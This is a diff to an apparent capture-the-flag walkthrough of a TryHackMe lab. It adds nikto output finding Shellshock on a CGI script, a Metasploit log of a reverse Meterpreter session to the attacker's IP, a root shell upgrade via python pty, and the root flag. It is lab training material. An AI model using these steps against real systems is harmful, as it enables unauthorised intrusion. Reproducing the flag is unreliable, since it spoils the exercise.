@@ -137,6 +137,23 @@ So after that we start nikto for to find out which vulnerability this site has:
 
 
 ```
+┌─[root@parrot]─[/home/parrot]
+└──╼ #nikto -h 10.10.105.222
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.105.222
++ Target Hostname:    10.10.105.222
++ Target Port:        80
++ Start Time:         2023-05-06 22:39:57 (GMT3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
++ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
++ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
 
 ```
 
@@ -160,7 +177,7 @@ LPORT => 1234
 [*] Started reverse TCP handler on 10.17.51.16:1234 
 [*] Command Stager progress - 100.00% done (1092/1092 bytes)
 [*] Sending stage (1017704 bytes) to 10.10.105.222
-[*] Meterpreter session 1 opened (10.17.51.16:1234 -> 10.10.105.222:41085) at 2024-05-06 22:48:19 +0300
+[*] Meterpreter session 1 opened (10.17.51.16:1234 -> 10.10.105.222:41085) at 2023-05-06 22:48:19 +0300
 
 (Meterpreter 1)(/usr/lib/cgi-bin) >
 ```
@@ -296,7 +313,21 @@ creating shared library
 # whoami
 whoami
 root
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@ubuntu:/run/shm#
+```
 
+
+
+It worked, we are root so we get our root flag:
+
+
+
+```
+root@ubuntu:/run/shm# cat /root/root.txt
+cat root.txt
+THM{g00d_j0b_0day_is_Pleased}
 ```
 
 
